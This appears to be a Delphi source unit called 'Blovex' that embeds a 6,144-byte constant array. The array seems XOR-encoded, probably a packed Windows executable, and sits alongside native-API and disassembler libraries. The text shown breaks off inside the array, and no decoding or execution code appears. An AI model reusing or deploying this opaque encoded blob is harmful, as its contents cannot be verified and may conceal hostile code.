{$E EXE}
{$IMAGEBASE $00410000}
{$R-}
{$Q-}
{$IFDEF minimum}
program Blovex;
{$ENDIF}
unit Blovex;
interface

uses
  Windows,
  WinNative,
  RTL,
  LDasm;

implementation

{$R version.res}

var
  Key: DWORD;
  tmp2: LBuf;

const
  hinst = $00410000;
  Title: PWideChar = 'Blovex 189 (17.08.2010)';

  data: array[0..6143] of byte = (
    $10, $06, $0B, $5A, $5B, $58, $57, $56, $51, $54, $48, $52, $96, $95, $4F, $4E,
    $D5, $4C, $4B, $4A, $49, $48, $47, $46, $05, $44, $2D, $42, $41, $40, $3F, $3E,
    $3D, $3C, $3B, $3A, $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $29, $28, $27, $26, $25, $24, $23, $22, $21, $1F, $1F, $1E,
    $A7, $0C, $1B, $10, $FE, $A4, $0E, $49, $34, $9C, $12, $C6, $44, $2F, $7F, $7E,
    $B9, $E4, $E2, $DB, $29, $D8, $D9, $DB, $E2, $D6, $E2, $D5, $21, $D3, $CA, $CF,
    $C9, $1C, $DD, $D5, $19, $CA, $C2, $CC, $15, $BF, $C9, $CE, $CC, $C2, $0F, $9B,
    $C4, $C2, $FC, $FC, $DC, $E2, $03, $F3, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $0D, $17, $5B, $5A, $0D, $57, $55, $56, $3C, $FA, $15, $6C, $51, $50, $4F, $4E,
    $4D, $4C, $4B, $4A, $A9, $48, $BD, $E5, $3E, $43, $45, $29, $41, $3A, $3F, $3E,
    $3D, $36, $3B, $3A, $39, $38, $37, $36, $41, $1C, $33, $32, $31, $20, $2F, $2E,
    $2D, $4C, $2B, $2A, $29, $28, $E7, $26, $25, $14, $23, $22, $21, $22, $1F, $1E,
    $1C, $1C, $1B, $1A, $19, $18, $17, $16, $11, $14, $13, $12, $11, $10, $0F, $0E,
    $0D, $DC, $0B, $0A, $09, $04, $07, $06, $05, $04, $03, $02, $03, $00, $FF, $FE,
    $FD, $FC, $EB, $FA, $F9, $B8, $F7, $F6, $F5, $F4, $E3, $F2, $F1, $E0, $EF, $EE,
    $ED, $EC, $EB, $EA, $D9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $9C, $DB, $DA, $C3, $D9, $D7, $D6, $D5, $B4, $D3, $D2, $D1, $D2, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $6C, $BB, $BA, $F5, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $26, $19, $1F, $1D, $61, $60, $5F, $5E,
    $11, $54, $5B, $5A, $59, $48, $57, $56, $55, $4E, $53, $52, $51, $4C, $4F, $4E,
    $4D, $4C, $4B, $4A, $49, $48, $47, $46, $45, $44, $43, $42, $61, $40, $3F, $1E,
    $F9, $FB, $E7, $F9, $39, $38, $37, $36, $1D, $34, $33, $32, $31, $50, $2F, $2E,
    $2D, $2E, $2B, $2A, $29, $1E, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $D9, $18, $17, $56, $D7, $C5, $C4, $12, $11, $10, $0F, $0E,
    $A0, $0E, $0B, $0A, $09, $18, $07, $06, $05, $04, $03, $02, $01, $F0, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $2E,
    $03, $C3, $C7, $C9, $B5, $C7, $E7, $E6, $CF, $E5, $E3, $E2, $E1, $A0, $DF, $DE,
    $DD, $D8, $DB, $DA, $D9, $C8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $89, $C8, $C7, $06, $DB, $96, $9E, $96, $96, $A1, $BF, $BE,
    $F9, $BC, $BB, $BA, $B9, $68, $B7, $B6, $B5, $B6, $B3, $B2, $B1, $9C, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $61, $A0, $9F, $4E,
    $B3, $6E, $6C, $6C, $7A, $98, $97, $96, $95, $96, $93, $92, $91, $70, $8F, $8E,
    $8D, $8E, $8B, $8A, $89, $76, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $39, $78, $77, $26, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $38, $67, $66, $65, $64, $63, $62, $61, $48, $5F, $5E,
    $5D, $5C, $5B, $5A, $59, $58, $57, $56, $55, $54, $53, $52, $11, $50, $4F, $FE,
    $4D, $4C, $4B, $4A, $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E,
    $3D, $3C, $3B, $3A, $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E,
    $0D, $0C, $0B, $0A, $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE,
    $ED, $EC, $EB, $EA, $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $A2, $77, $D7, $1A, $19, $58, $D0, $96, $9A, $6F, $D3, $12, $11, $50, $C8, $8E,
    $92, $67, $0F, $0A, $09, $48, $C0, $86, $8A, $5F, $0B, $02, $01, $40, $B8, $7E,
    $82, $57, $0B, $FA, $F9, $38, $B0, $76, $7A, $4F, $07, $F2, $F1, $30, $A8, $6E,
    $72, $47, $03, $EA, $E9, $28, $A0, $66, $6A, $3F, $FF, $E2, $E1, $20, $98, $5E,
    $62, $37, $FB, $DA, $D9, $18, $90, $56, $5A, $2F, $B7, $D2, $D1, $10, $88, $4E,
    $52, $27, $B3, $CA, $C9, $08, $80, $46, $4A, $1F, $AF, $C2, $C1, $00, $78, $3E,
    $42, $17, $AB, $BA, $B9, $F8, $70, $36, $D3, $75, $3B, $D1, $B5, $EA, $CD, $6F,
    $35, $B6, $B0, $E6, $C7, $03, $0C, $E6, $26, $57, $A3, $E2, $92, $8E, $8C, $89,
    $8C, $53, $C7, $F6, $52, $30, $E8, $1B, $E6, $22, $B1, $4B, $8D, $9B, $CF, $26,
    $F9, $11, $10, $0F, $42, $F0, $40, $C2, $E1, $A2, $3C, $BE, $91, $18, $FD, $03,
    $02, $01, $99, $C3, $FA, $89, $B4, $3B, $B4, $B4, $B3, $B2, $0A, $A8, $8D, $B7,
    $EE, $7A, $AC, $2B, $DE, $ED, $85, $21, $CD, $70, $9E, $60, $1C, $E5, $6B, $D8,
    $16, $D9, $45, $3D, $3E, $3E, $40, $D7, $42, $0B, $D0, $09, $C0, $CF, $E6, $90,
    $9C, $CC, $DD, $23, $00, $B7, $08, $E5, $86, $D6, $1D, $27, $C2, $F3, $3F, $7E,
    $C2, $97, $B7, $3A, $39, $78, $F0, $B6, $BA, $8F, $B3, $32, $31, $70, $E8, $AE,
    $B2, $87, $EF, $2A, $29, $68, $E0, $A6, $AA, $7F, $EB, $22, $21, $60, $D8, $9E,
    $A2, $77, $E7, $1A, $19, $58, $D0, $96, $9A, $6F, $E3, $12, $11, $50, $C8, $8E,
    $92, $67, $DF, $0A, $09, $48, $C0, $86, $8A, $5F, $DB, $02, $01, $40, $B8, $7E,
    $82, $57, $D7, $FA, $F9, $38, $B0, $76, $7A, $4F, $D3, $F2, $F1, $30, $A8, $6E,
    $72, $47, $8F, $EA, $E9, $28, $A0, $66, $6A, $3F, $8B, $E2, $E1, $20, $98, $5E,
    $62, $37, $87, $DA, $D9, $18, $90, $56, $5A, $2F, $83, $D2, $D1, $10, $88, $4E,
    $52, $27, $7F, $CA, $C9, $08, $80, $46, $B0, $7D, $57, $B3, $3E, $00, $E7, $FE,
    $FD, $FC, $74, $9D, $E9, $6F, $9F, $F2, $6C, $A4, $EB, $69, $A9, $E4, $68, $99,
    $E1, $63, $9B, $DA, $62, $93, $DF, $5D, $95, $D0, $8C, $85, $23, $D4, $DF, $4E,
    $88, $55, $2F, $5B, $15, $0C, $88, $56, $98, $C4, $D3, $9E, $C2, $43, $8A, $12,
    $7D, $A6, $CB, $A4, $E1, $A2, $0D, $1E, $41, $09, $08, $07, $3A, $E8, $18, $B3,
    $30, $77, $FF, $6A, $93, $D0, $91, $FB, $0D, $1D, $F8, $F7, $F6, $29, $D7, $29,
    $D6, $78, $A7, $23, $EA, $01, $82, $1F, $60, $9C, $B4, $D4, $18, $5B, $EF, $15,
    $48, $E8, $D8, $55, $BD, $97, $97, $96, $95, $0D, $4E, $E2, $08, $4B, $EF, $07,
    $48, $D8, $02, $45, $E5, $08, $4A, $7A, $85, $50, $7A, $BF, $3C, $D8, $81, $7E,
    $7D, $7C, $D4, $75, $8A, $B8, $EE, $31, $CD, $E7, $2E, $C6, $21, $E3, $2A, $A2,
    $1D, $46, $5B, $DD, $24, $8C, $17, $40, $65, $DD, $1E, $A6, $11, $B8, $15, $A3,
    $A2, $A1, $D4, $82, $D2, $13, $9B, $06, $AD, $4D, $98, $97, $96, $CF, $98, $4C,
    $4C, $4C, $4B, $15, $44, $D1, $26, $46, $45, $84, $BC, $83, $EA, $B9, $9A, $E1,
    $7F, $30, $3B, $AA, $E4, $B1, $8B, $E5, $46, $74, $AA, $ED, $75, $A9, $EA, $1E,
    $DD, $04, $2B, $1A, $19, $28, $9A, $E1, $1D, $D4, $FD, $22, $94, $DB, $63, $CE,
    $F7, $61, $73, $79, $5F, $5D, $5C, $96, $D8, $08, $13, $DE, $00, $91, $D2, $52,
    $0D, $D8, $04, $83, $B4, $00, $80, $C1, $49, $5C, $DD, $48, $46, $45, $78, $B9,
    $41, $A3, $9E, $3C, $ED, $F8, $70, $36, $A0, $6D, $47, $A1, $02, $30, $66, $A9,
    $31, $C4, $EB, $6A, $E9, $E8, $5A, $A1, $29, $94, $56, $9D, $D9, $90, $B9, $23,
    $35, $75, $21, $1F, $1E, $7F, $7A, $18, $D1, $D4, $4C, $12, $7C, $49, $23, $4F,
    $09, $14, $A2, $85, $C1, $B8, $E4, $C6, $C5, $11, $EB, $29, $38, $7B, $07, $35,
    $68, $00, $2E, $75, $01, $68, $91, $B6, $0D, $25, $F9, $F7, $F6, $57, $56, $51,
    $EF, $A8, $AB, $1A, $4D, $A8, $69, $A6, $84, $A4, $74, $A2, $7C, $A0, $55, $9E,
    $7C, $9C, $6E, $9A, $74, $98, $73, $96, $4A, $94, $75, $92, $6B, $90, $6A, $8E,
    $6E, $8C, $57, $8A, $5A, $88, $2B, $86, $47, $84, $57, $82, $56, $80, $4D, $7E,
    $58, $7C, $43, $7A, $38, $78, $43, $76, $22, $74, $48, $72, $43, $70, $48, $6E,
    $6D, $6C, $6B, $6A, $39, $68, $39, $66, $40, $64, $31, $62, $29, $60, $75, $5E,
    $38, $5C, $23, $5A, $34, $58, $57, $56, $55, $54, $53, $52, $02, $FF, $C8, $76,
    $27, $4B, $25, $4A, $23, $48, $BA, $02, $61, $38, $F3, $1C, $86, $F1, $DE, $2E,
    $5D, $FC, $3B, $EA, $91, $5D, $7A, $7B, $7A, $AF, $73, $FD, $28, $A9, $2B, $4A,
    $DD, $84, $8D, $6D, $6E, $6D, $D1, $CF, $66, $97, $E3, $22, $CC, $99, $73, $9F,
    $59, $64, $F5, $11, $F1, $14, $16, $16, $15, $EC, $8F, $24, $D1, $10, $82, $C9,
    $55, $BC, $84, $C5, $01, $B8, $5F, $29, $48, $49, $48, $A9, $A8, $A3, $41, $FA,
    $FD, $6F, $BB, $FA, $A4, $71, $4B, $A5, $A6, $67, $AE, $36, $A1, $CA, $EF, $67,
    $A8, $E4, $9B, $C2, $ED, $D9, $A7, $E6, $BF, $E4, $BD, $E2, $39, $65, $23, $23,
    $22, $55, $03, $B2, $25, $D7, $D7, $D6, $86, $2C, $05, $16, $16, $15, $D2, $D0,
    $CC, $CC, $CB, $95, $C3, $A2, $C7, $77, $1D, $4D, $07, $07, $06, $19, $AF, $5D,
    $B5, $CC, $7B, $BA, $11, $99, $FC, $FB, $FA, $65, $0B, $29, $F5, $F5, $F4, $57,
    $54, $4F, $ED, $A6, $A9, $1B, $67, $A6, $56, $52, $50, $51, $1A, $E8, $B0, $C7,
    $25, $18, $AD, $5A, $99, $22, $8F, $96, $95, $94, $EB, $D9, $D5, $D5, $D4, $3A,
    $67, $94, $63, $46, $9B, $48, $87, $60, $85, $31, $DB, $A1, $C4, $C5, $C4, $1D,
    $51, $8E, $3B, $7A, $FA, $B8, $79, $ED, $71, $90, $4D, $6E, $4B, $6F, $E8, $2A,
    $89, $64, $1B, $C2, $7D, $AE, $AC, $AB, $06, $24, $75, $22, $61, $0C, $D8, $1A,
    $79, $58, $0B, $F9, $19, $6A, $17, $56, $05, $2E, $55, $FF, $A9, $A5, $93, $93,
    $92, $EB, $0B, $5C, $09, $48, $C0, $16, $41, $BF, $91, $0E, $63, $B9, $6D, $C6,
    $E9, $28, $FB, $3A, $91, $E9, $7B, $7B, $7A, $AF, $73, $FD, $29, $DD, $87, $3D,
    $72, $71, $70, $83, $23, $C7, $1F, $36, $E5, $24, $7B, $55, $67, $65, $64, $BD,
    $DD, $2E, $DB, $1A, $C9, $70, $FD, $5C, $5A, $59, $8C, $53, $BB, $B5, $B5, $B7,
    $4E, $0C, $0B, $0A, $C7, $08, $DE, $06, $D9, $04, $DE, $02, $01, $00, $FF, $FE,
    $AE, $AA, $A8, $A5, $7C, $E8, $07, $B6, $F5, $05, $1C, $03, $31, $91, $DB, $0E,
    $AD, $EC, $28, $A5, $E9, $FC, $E9, $E6, $E5, $BE, $E3, $BC, $E3, $38, $45, $27,
    $22, $21, $7C, $CE, $E9, $98, $D7, $57, $D8, $C8, $E3, $92, $D1, $15, $C4, $4A,
    $4C, $CC, $CB, $CA, $74, $67, $BB, $D6, $85, $C4, $73, $1A, $39, $09, $04, $03,
    $38, $FC, $87, $98, $3F, $B7, $B7, $B6, $B5, $39, $AF, $D2, $71, $B0, $22, $69,
    $C9, $25, $98, $02, $E5, $F1, $EC, $EB, $20, $E4, $6E, $AA, $1A, $5B, $97, $A7,
    $98, $90, $BB, $5A, $99, $64, $AA, $56, $36, $80, $B3, $52, $91, $2F, $7B, $AE,
    $4D, $8C, $3B, $64, $89, $62, $86, $DE, $59, $CD, $C8, $C7, $FA, $A8, $FA, $A7,
    $49, $72, $55, $7A, $2A, $D0, $55, $BF, $BA, $B9, $24, $CA, $29, $B9, $B4, $B3,
    $FE, $6B, $C4, $89, $EA, $A5, $63, $1C, $30, $F0, $0E, $01, $55, $70, $1F, $5E,
    $0D, $B4, $75, $A3, $9E, $9D, $D2, $96, $20, $BE, $F2, $46, $61, $10, $4F, $FE,
    $A5, $6D, $94, $8F, $8E, $C1, $88, $E9, $EA, $EA, $EC, $83, $F2, $EE, $EC, $BF,
    $79, $64, $4C, $7F, $11, $3D, $37, $2B, $35, $0E, $33, $0C, $31, $88, $8D, $78,
    $72, $71, $A4, $52, $A4, $51, $F3, $E5, $FF, $20, $FB, $9E, $0C, $E0, $1F, $CF,
    $75, $5D, $65, $5F, $5E, $91, $67, $91, $63, $E0, $2B, $85, $CD, $2C, $0B, $98,
    $29, $0C, $0B, $0A, $61, $DD, $50, $4B, $4A, $B0, $DD, $1E, $74, $BC, $1B, $F2,
    $AD, $D6, $FB, $A8, $51, $65, $41, $3B, $3A, $6D, $B7, $0E, $11, $9E, $47, $51,
    $37, $31, $30, $9B, $41, $55, $31, $2B, $2A, $5D, $20, $63, $1D, $F8, $84, $84,
    $86, $1D, $DB, $DA, $9A, $D8, $88, $D6, $8C, $D4, $84, $D2, $B2, $D0, $AE, $CE,
    $A3, $CC, $A1, $CA, $A4, $C8, $99, $C6, $C5, $C4, $C3, $C2, $72, $6E, $6C, $3F,
    $F9, $E4, $34, $02, $30, $BC, $D3, $C7, $F5, $2B, $6F, $CE, $AD, $8A, $AF, $88,
    $AD, $86, $AB, $1D, $65, $C4, $8B, $B7, $DC, $B5, $D5, $FA, $09, $E9, $E4, $E3,
    $AE, $DC, $12, $56, $B5, $90, $A8, $D6, $0C, $50, $AF, $86, $3D, $03, $4B, $AA,
    $79, $3C, $65, $4A, $FC, $44, $A3, $72, $35, $DC, $95, $CB, $C6, $C5, $FA, $BE,
    $48, $55, $1A, $7E, $8B, $38, $77, $EF, $85, $2A, $EE, $C0, $35, $1B, $2D, $7F,
    $96, $E5, $AC, $6B, $A9, $E1, $52, $6A, $77, $24, $63, $6B, $25, $A2, $5B, $29,
    $63, $D5, $46, $5E, $6B, $18, $57, $D6, $19, $96, $4B, $4B, $1C, $5F, $29, $4D,
    $27, $4C, $25, $4A, $BC, $F4, $63, $2E, $F7, $1E, $88, $BB, $2C, $44, $51, $FE,
    $3D, $31, $C8, $F6, $7B, $32, $E7, $AF, $F1, $50, $53, $E2, $89, $5D, $79, $73,
    $72, $A7, $6B, $F5, $23, $A1, $E3, $42, $19, $D4, $7B, $49, $6B, $65, $64, $DF,
    $D3, $E7, $B1, $93, $D5, $34, $0F, $C6, $6D, $4D, $5D, $57, $56, $91, $4B, $26,
    $B2, $B2, $B4, $4B, $BA, $B6, $B4, $B1, $B4, $7D, $5B, $79, $14, $74, $11, $BE,
    $FD, $0D, $3B, $9B, $69, $0A, $B7, $F6, $CF, $F4, $CD, $F2, $CB, $F0, $77, $5A,
    $FF, $AC, $EB, $FB, $20, $F9, $19, $3E, $09, $2E, $28, $27, $F2, $20, $80, $CE,
    $FD, $9C, $DB, $B2, $4D, $EA, $97, $D6, $AD, $40, $E5, $92, $D1, $AA, $8F, $A6,
    $BD, $EC, $8B, $CA, $21, $95, $11, $0B, $0A, $3F, $03, $8D, $8D, $5F, $C3, $D0,
    $7D, $BC, $34, $CA, $6F, $33, $05, $7A, $58, $72, $C4, $DB, $2A, $F9, $B0, $F3,
    $4C, $B0, $BD, $6A, $A9, $B1, $7B, $EE, $A1, $6F, $60, $7C, $A3, $7A, $9F, $78,
    $9D, $0F, $57, $B6, $8D, $48, $71, $DB, $34, $98, $A5, $52, $91, $85, $1C, $4A,
    $D5, $86, $3B, $29, $79, $A8, $47, $86, $35, $DC, $9D, $CC, $C6, $C5, $FA, $BE,
    $48, $9C, $1A, $7E, $8B, $38, $77, $6B, $02, $30, $BB, $6C, $12, $68, $7F, $2E,
    $6D, $E5, $67, $86, $C1, $ED, $AB, $AB, $AA, $DD, $5F, $7E, $11, $B8, $4D, $A8,
    $A2, $A1, $1C, $10, $24, $F6, $F6, $46, $75, $14, $53, $02, $A9, $4D, $99, $93,
    $92, $F6, $EE, $EF, $EF, $F1, $88, $B6, $F6, $F3, $BC, $6A, $99, $89, $82, $83,
    $82, $FC, $DC, $2E, $59, $F8, $37, $B7, $38, $28, $53, $F2, $31, $30, $FB, $32,
    $85, $45, $6E, $6F, $6E, $A4, $67, $F2, $36, $D0, $D4, $C1, $25, $32, $DF, $1E,
    $CD, $F6, $0B, $72, $A9, $5F, $5C, $5B, $B4, $00, $33, $D2, $11, $68, $C9, $54,
    $52, $51, $E5, $04, $61, $19, $50, $4B, $4A, $5C, $05, $45, $46, $45, $7B, $3E,
    $C8, $4C, $9A, $EE, $19, $B8, $F7, $4E, $4D, $3A, $38, $37, $9B, $99, $30, $5E,
    $9E, $9B, $FC, $2A, $60, $E4, $03, $C0, $E5, $BE, $E2, $BC, $CD, $38, $25, $25,
    $22, $21, $64, $DA, $D9, $98, $D7, $B0, $D1, $AE, $D2, $83, $29, $41, $19, $13,
    $12, $6D, $CF, $DC, $89, $C8, $48, $C9, $C9, $D6, $83, $C2, $C1, $B5, $3B, $37,
    $BD, $BC, $BB, $59, $B9, $D8, $77, $B6, $65, $8C, $77, $C4, $71, $B0, $07, $B1,
    $F4, $F1, $F0, $84, $A9, $82, $A7, $80, $A5, $2E, $67, $B4, $61, $A0, $27, $0A,
    $AF, $5C, $9B, $21, $59, $98, $97, $96, $ED, $0D, $DA, $D7, $D6, $68, $FB, $A0,
    $4D, $8C, $63, $8B, $89, $6D, $87, $F9, $41, $A0, $7B, $32, $D9, $C5, $C7, $C3,
    $C2, $F7, $BB, $45, $5D, $F1, $B8, $CE, $89, $B9, $B8, $B7, $4B, $70, $E8, $2A,
    $89, $68, $1B, $C2, $B9, $B0, $AC, $AB, $DE, $60, $7F, $12, $B9, $4D, $A6, $A3,
    $A2, $E6, $5B, $5A, $19, $58, $F6, $5A, $67, $14, $53, $AA, $D9, $98, $94, $93,
    $C6, $8D, $A3, $49, $8E, $8D, $8C, $1E, $BD, $35, $43, $42, $99, $19, $89, $83,
    $82, $95, $61, $D9, $3D, $4A, $F7, $36, $E5, $8C, $3D, $7C, $76, $75, $D9, $D7,
    $6E, $9F, $EB, $2A, $AA, $3B, $23, $36, $E5, $24, $22, $F3, $1A, $78, $35, $63,
    $62, $61, $2A, $5A, $D9, $5A, $0B, $16, $56, $87, $D3, $12, $11, $10, $0F, $0E,
    $0D, $0C, $0B, $0A, $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE,
    $ED, $EC, $EB, $EA, $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $5D, $5C, $5B, $5A, $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E,
    $4D, $4C, $4B, $4A, $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E,
    $3D, $3C, $3B, $3A, $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E,
    $0D, $0C, $0B, $0A, $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE,
    $ED, $EC, $EB, $EA, $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $E9, $4E, $1B, $5A, $A5, $4A, $17, $56, $4D, $45, $13, $52, $51, $50, $4F, $4E,
    $4D, $4C, $4B, $4A, $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E,
    $3D, $3C, $3B, $3A, $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E,
    $0D, $0C, $0B, $0A, $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE,
    $ED, $EC, $EB, $EA, $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $5D, $5C, $5B, $5A, $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E,
    $4D, $4C, $4B, $4A, $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E,
    $3D, $3C, $3B, $3A, $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E,
    $0D, $0C, $0B, $0A, $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE,
